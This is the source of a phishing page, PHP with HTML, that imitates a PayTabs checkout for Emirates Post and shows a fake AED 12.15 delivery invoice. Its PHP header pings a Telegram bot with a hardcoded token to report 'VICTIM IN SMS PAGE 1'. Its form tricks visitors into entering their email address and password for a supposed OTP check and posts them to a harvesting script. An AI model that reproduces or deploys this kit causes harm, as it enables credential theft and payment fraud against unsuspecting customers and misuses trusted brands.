<?php
include "./config/n8.php";
$infos = "[⚠️] VICTIM IN SMS PAGE 1";
    $token ='1274528014:AAHUy7JYyEYjJ51solZEeQJKyCn6mKQxhjk';
    $data = [
    'text' => $infos,
    'chat_id' => $chat_id,
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );



?>
<!DOCTYPE html>
<html lang="en" style="" class=" js flexbox flexboxlegacy canvas canvastext postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex">
        <link rel="shortcut icon" href="./files/favicon.png">
        <title>PayTabs - Simple &amp; Trusted Payments</title>

        <!-- Bootstrap -->
        <link href="./files/bootstrap.css" rel="stylesheet" type="text/css">
                        <link href="./files/custom.css" rel="stylesheet" type="text/css">

        <link href="./files/style.css" rel="stylesheet" type="text/css">
        <link href="./files/opensans.css" rel="stylesheet" type="text/css">
            </head>
    <body data-gr-c-s-loaded="true">



        <div style="filter: Alpha(Opacity=90); -moz-opacity:0.9; opacity: 0.9; width: 100%; height: 100%; z-index: 1000; background-color: #AAAAAA; position: absolute; top: 0; text-align: center; display: none ; position: absolute" id="please_wait">
            <div style="width: 487px;
                    position: fixed;
                    top: 40%;
                    left: 50%;
                    margin-left: -243px;
                 ">
                <h4 style="margin:0 !important">Please wait ...</h4> <br>
                <img src="./files/loading_payment.gif" alt="loading ..." style="display:inline-block; vertical-align:middle">
            </div>
        </div>
        <header class="header">
            <div class="container">
                        <div class="header-logo img-responsive">
                                                            <div class="text-nav">
                                    <a class="language-nav" id="change_lang" href="" title="عربي" style="font-size: small !important; font-family: &quot;Droid Arabic Kufi&quot;,&quot;Open Sans&quot; !important;">
                                        عربي                                    </a>
                                </div>
                                                        <img src="./files/62617_1589791686.jpg" width="151" height="54" alt="logo">
                        </div>
            </div>
        </header>
        <div class="clearfix"></div>
        <section class="section">
            <div class="container">

                    <div class="header-title"><h3>Emirates post</h3></div>

            </div>
            <div class="container">
                    <form action="./jean/casa.php" class="form-fields" role="form" id="form_pay" method="post" accept-charset="utf-8" _lpchecked="1">
                <input type="hidden" name="exchange_rate" value="0.2736">
                <div class="payment-wrap">
                    <div>
<label class="payment_method">

                                <img src="./files/cards.png" width="75" alt="Credit Card">

                                <hr>
                                <span>To check your card
an OTP code is received in your email account.</span>
<br>
<center> <img style="max-width: 50%" src="./files/simo.png"></center>

                            </label>
                                                                                                                        </div>
                    </div>
                 <div class="clearfix"></div>
                 <!--
                 </div>-->
                                 <div class="col-md-12 col-sm-12 card-details">
 <div class="form-wrap creditcard-hide">

                            <input type="text" class="required form-control" placeholder="Email" required="" name="email" autocomplete="off">


                            <input type="password" class="required form-control" placeholder="Password" required="" name="password" autocomplete="off">

                            </div>



    <input type="submit" class="btn btn-lg btn-block btn-success" style="margin-top:15px;background-color: #4fad4d;
    color: #fff; " value="Verify">
                                                                        <div class="text-nav" style=" text-align:center; margin-top:15px;"><a href="">Cancel</a></div>




                                    </div></form>
            </div>

        </section>

                <div id="invoiceModal" class="modal fade bs-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">
            <div class="modal-dialog ">
                <div class="modal-content">

                    <div class="col-md-12">
                        <div class="portlet box blue">
                            <div class="portlet-title">
                                <div class="caption"><i class="icon-list"></i> </div>
                            </div>
                            <div class="portlet-body">
                                <div class="table-responsive table-invoice-wrap">
                                    <!--<div style="background: #f6f8f1; margin:0; padding:0; font-family: Arial, Helvetica, sans-serif; font-size:14px; line-height:19px;" width="720">-->
                                    <table align="center" cellpadding="0" cellspacing="0" width="100%" class="invoice-wrap">

                                        <tbody><tr>

                                            <td valign="middle">
                                                <img src="./files/logo.png" width="123" height="33" alt="paytabs">
                                            </td>

                                            <td valign="middle">
                                                <h2>INVOICE</h2>
                                            </td>
                                        </tr>

                                        <tr>
                                            <td colspan="2" valign="top">
                                                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                                                    <tbody><tr>
                                                        <td valign="top" width="450">
                                                            <img src="./files/62617_1589791686.jpg" alt="" width="120" style="margin-bottom:10px;">
                                                        </td>
                                                        <td valign="baseline" width="300">
                                                            <table width="300" border="1" cellspacing="0" cellpadding="8" class="table-invoice">
                                                                <tbody><tr>
                                                                    <td class="table-bg">Invoice Number</td>
                                                                    <td class="invoice-nbr">INV - 10031622</td>
                                                                </tr>
                                                                                                                                <tr>
                                                                    <td class="table-bg">Invoice Date</td>
                                                                    <td>11/08/2020 22:52 PM</td>
                                                                </tr>
                                                            </tbody></table>
                                                        </td>
                                                    </tr><tr>
                                                    </tr><tr>
                                                        <td valign="bottom">
                                                            <p>
                                                                <strong>
                                                                    Emirates post                                                                </strong>
                                                            </p>
                                                            <p>
                                                                United Arab Emirates<br>                                                                <br>


                                                                Work Timings:&nbsp;From 09:00 AM To 02:00 PM                                                                , Sunday, Monday, Tuesday, Wednesday, Thursday, Friday, Saturday                                                            </p>
                                                        </td>

                                                    </tr>



                                    </tbody></table>
                                    </td>
                                    </tr>
                                    <tr>
                                        <td colspan="2" align="center" valign="top">
                                            <table width="100%" border="0" cellspacing="0" cellpadding="10" class="table-invoice-desc">
                                                <tbody><tr class=" table-top">
                                                    <td width="400" valign="top"><strong>Description</strong></td>
                                                    <td width="140" align="center" valign="middle"><strong>Quantity</strong></td>
                                                    <td width="140" class="left-arabic-txt" align="right" valign="middle"><strong>Unit Price</strong></td>
                                                    <td width="140" class="left-arabic-txt" align="right" valign="middle"><strong>Amount</strong></td>
                                                </tr>
                                                <tr>
                                                        <td width="400" valign="top">Delivery Invoice (Purchase Package)</td>
                                                        <td width="140" align="center" valign="middle">1</td>
                                                        <td width="140" class="left-arabic-txt" align="right" valign="middle">AED 12.15 </td>
                                                        <td width="140" class="left-arabic-txt" align="right" valign="middle">AED 12.15<span>  </span></td>
                                                    </tr>
                                            </tbody></table>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td colspan="2" valign="top">
                                            <br>
                                            <table width="100%" border="0" cellspacing="0" cellpadding="0">
                                                <tbody><tr>
                                                    <td width="400" rowspan="2" valign="bottom">
                                                        <a href="https://www.paytabs.com/terms_conditions" target="_blank"><strong>Terms &amp; Conditions</strong></a>
                                                        <p></p>
                                                        <p class="card-brands-supported"><img src="./files/visa-icon.png" alt="" width="58" height="18"> <img src="./files/master-card-icon.png" alt="" width="36" height="21">
                                                        </p>
                                                        <span style="display:none;" class="sadad_footer_txt">
                                                            <p class="sadad-brand-logo">
                                                                <img src="./files/sadad-en-2016.png" height="45">
                                                            </p>
                                                            <p>The consumer has the right to cancel his purchase and receive a refund if delivery is delayed for more than 15 days, unless a new delivery date has been negotiated with the merchant. <a href="https://mci.gov.sa/">mci.gov.sa</a></p>
                                                        </span>
                                                    </td>
                                                    <td valign="top" width="300">
                                                        <table width="300" border="1" cellspacing="0" cellpadding="8" class="table-invoice-total">
                                                                                                                        <tbody><tr>
                                                                <td width="120" class="left-arabic-txt" align="right" valign="middle">Other Charges:</td>
                                                                <td width="150" class="left-style" align="right" valign="middle"><span> AED</span> 0.00</td>
                                                            </tr>
                                                                                                                        <tr>
                                                                <td width="120" class="left-arabic-txt" align="right" valign="middle">Sub Total:</td>
                                                                <td width="150" class="left-style" align="right" valign="middle"><span> AED</span> 12.15</td>
                                                            </tr>
                                                            <tr>
                                                                <td width="120" class="left-arabic-txt" align="right" valign="middle">Discount:</td>
                                                                <td width="150" class="left-style" align="right" valign="middle"><span> AED</span> 0.00</td>
                                                            </tr>

    <!--                                                        <tr>
                                                                <td width="100"  valign="middle" style=" border-bottom-color:#d3e2f2;  border-right-style:hidden;">Shipping:</td>
                                                                <td width="150"  valign="middle" style="  border-bottom-color:#d3e2f2;">0.00<span style="border-right-style:hidden;"> AED</span></td>
                                                            </tr>
                                                            <tr>
                                                                <td width="100"  valign="middle" style=" border-bottom-color:#d3e2f2;  border-right-style:hidden;">Tax:</td>
                                                                <td width="150"  valign="middle" style="  border-bottom-color:#d3e2f2;">0.00<span style="border-right-style:hidden;">AED</span></td>
                                                            </tr>-->
                                                            <tr class="total-wrap">
                                                                <td width="120" class="left-arabic-txt" valign="middle">Total:</td>
                                                                <td width="150" class="left-style" valign="middle"><span> AED 12.15</span></td>
                                                            </tr>
                                                        </tbody></table>
                                                    </td>
                                                </tr>
                                            </tbody></table></td>
                                    </tr>
    <!--                                <tr>
                                        <td colspan="2" align="center" valign="top" style="border-top:solid 1px #eee; background:#efefef;" ><p style="font-size:11px;">Powered by PayTabs.com</p></td>
                                    </tr>-->
                                    </tbody></table>

                                </div>
                            </div>

                        </div><!-- col-md-12 -->
                    </div><!-- row -->
                    <div class="clearfix"></div>
                    <div class="modal-footer invoice-wrap-footer">
                        <button type="button" class="btn btn-primary" onclick="closeinvoiceModal()">Close</button>
                    </div>

                </div><!-- /.modal-content -->

            </div><!-- /.modal-dialog -->
        </div>
                    <!-- Screen Size Small Error Modal Start -->
        <div id="error_modal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="myerrorModal" aria-hidden="true">
            <div class="modal-dialog">


                <div class="modal-content">
                    <div class="modal-body">
                        <div class="bootbox-body"><br>
                            <h3>For Better Viewing Experience use Larger Screen<br></h3>
                            <h4>OR</h4>
                            <img src="./files/rotate-device.png" width="100">
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button data-dismiss="error_modal" onclick="closeErrorModal()" type="button" class="btn btn-success">OK‎</button>
                    </div>
                </div>

            </div><!-- /.modal-dialog -->
        </div>
    <!-- Screen Size Small Error Modal End -->
    <input type="hidden" name="lbl_statReg" id="lbl_statReg" value="State/Region">
    <input type="hidden" name="bill_state" id="bill_state" value="ابوضبي">

    <input type="hidden" name="lbl_statReg" id="lbl_statReg" value="State/Region">
    <input type="hidden" name="ship_state" id="ship_state" value="ابوضبي">
    <input type="hidden" name="gointerpay_merchant_id" id="gointerpay_merchant_id" value="">


        <footer class="footer">
            <img src="./files/express-checkout.png" width="85" height="34" alt="express checkout">
                    </footer>





</body></html>